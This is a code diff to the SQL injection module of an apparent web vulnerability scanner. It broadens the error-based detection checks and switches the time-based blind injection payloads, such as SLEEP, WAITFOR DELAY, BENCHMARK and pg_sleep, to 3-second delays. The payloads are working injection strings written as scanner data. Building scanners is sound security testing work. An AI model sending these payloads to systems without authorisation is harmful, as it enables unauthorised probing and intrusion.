@@ -219,6 +219,7 @@ class SQLiModule(BaseModule):
     def _validate_sql_context(self, payload: str, response_text: str, matches: List[str]) -> bool:
         """
         Validate SQL error context
+        IMPROVED: More flexible to catch real SQL errors
 
         Args:
             payload: Injected payload
@@ -228,26 +229,47 @@ class SQLiModule(BaseModule):
         Returns:
             True if context is valid
         """
-        # Check 1: Error should mention SQL syntax
-        sql_keywords = ['select', 'from', 'where', 'syntax', 'query', 'statement']
         response_lower = response_text.lower()
 
+        # Check 1: Strong SQL error indicators (immediate pass)
+        strong_errors = [
+            'you have an error in your sql syntax',
+            'warning: mysql',
+            'warning: mysqli',
+            'unclosed quotation mark',
+            'quoted string not properly terminated',
+            'ora-01756',
+            'postgresql query failed',
+            'pg_query()',
+            'pg_exec()',
+        ]
+        if any(err in response_lower for err in strong_errors):
+            return True
+
+        # Check 2: Error should mention SQL syntax (lowered threshold)
+        sql_keywords = ['select', 'from', 'where', 'syntax', 'query', 'statement', 'database', 'table']
         sql_mentions = sum(1 for keyword in sql_keywords if keyword in response_lower)
-        if sql_mentions >= 2:
+        if sql_mentions >= 1:  # IMPROVED: Reduced from 2 to 1
             return True
 
-        # Check 2: Error shows actual SQL code
-        if "'" in response_text and any(kw in response_lower for kw in ['select', 'from', 'where']):
+        # Check 3: Error shows actual SQL code
+        if "'" in response_text and any(kw in response_lower for kw in ['select', 'from', 'where', 'insert', 'update']):
             return True
 
-        # Check 3: Database function names
-        db_functions = ['mysql_', 'pg_', 'oci_', 'mssql_', 'sqlite_']
+        # Check 4: Database function names
+        db_functions = ['mysql_', 'pg_', 'oci_', 'mssql_', 'sqlite_', 'mysqli_']
         if any(func in response_lower for func in db_functions):
             return True
 
-        # Check 4: Multiple error patterns (already validated)
+        # Check 5: Multiple error patterns (already validated)
         if len(matches) >= 2:
             return True
+
+        # Check 6: Single very strong match
+        if len(matches) >= 1:
+            for match in matches:
+                if any(strong in match.lower() for strong in ['sql syntax', 'mysql', 'postgresql', 'oracle', 'mssql']):
+                    return True
 
         return False
 
@@ -297,14 +319,19 @@ class SQLiModule(BaseModule):
         results = []
         import time
 
-        # Time-based blind SQLi payloads (5 second delays)
-        # These work across multiple databases
+        # Time-based blind SQLi payloads (3 second delays for faster scanning)
+        # IMPROVED: Reduced from 5s to 3s for better performance
         time_payloads = [
-            "1' AND SLEEP(5)--",
-            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "1' OR IF(1=1,SLEEP(5),0)--",
-            "1'; WAITFOR DELAY '0:0:5'--",
-            "1' AND BENCHMARK(5000000,MD5('A'))--",
+            "1' AND SLEEP(3)--",
+            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
+            "1' OR IF(1=1,SLEEP(3),0)--",
+            "1'; WAITFOR DELAY '0:0:3'--",
+            "1' AND BENCHMARK(3000000,MD5('A'))--",
+            # Also test without the leading value
+            "' AND SLEEP(3)--",
+            "' OR SLEEP(3)--",
+            # PostgreSQL
+            "1' AND pg_sleep(3)--",
         ]
 
         # Test both GET and POST for blind SQLi
@@ -378,10 +405,10 @@ class SQLiModule(BaseModule):
                     logger.debug(f"Payload '{payload}' response time: {elapsed:.2f}s")
 
                     # STAGE 3: Check if response was delayed
-                    # Expect ~5 second delay (allow 4-10 second range)
+                    # IMPROVED: Expect ~3 second delay (allow 2.5-8 second range for reliability)
                     delay_diff = elapsed - baseline_avg
 
-                    if delay_diff >= 4.0 and delay_diff <= 10.0:
+                    if delay_diff >= 2.5 and delay_diff <= 8.0:
                         # Likely blind SQLi detected!
                         # Verify with one more test to reduce false positives
 
@@ -394,7 +421,7 @@ class SQLiModule(BaseModule):
                         verify_elapsed = time.time() - start_time
                         verify_diff = verify_elapsed - baseline_avg
 
-                        if verify_diff >= 4.0:
+                        if verify_diff >= 2.5:
                             # Confirmed blind SQLi
                             confidence = 0.80
 
@@ -405,7 +432,7 @@ class SQLiModule(BaseModule):
                             evidence = f"Time-based Blind SQLi detected. Baseline: {baseline_avg:.2f}s, "
                             evidence += f"With payload: {elapsed:.2f}s (delay: {delay_diff:.2f}s), "
                             evidence += f"Verification: {verify_elapsed:.2f}s (delay: {verify_diff:.2f}s). "
-                            evidence += f"Payload caused consistent ~5 second delay indicating SLEEP() execution."
+                            evidence += f"Payload caused consistent ~3 second delay indicating SLEEP() execution."
 
                             result = self.create_result(
                                 vulnerable=True,
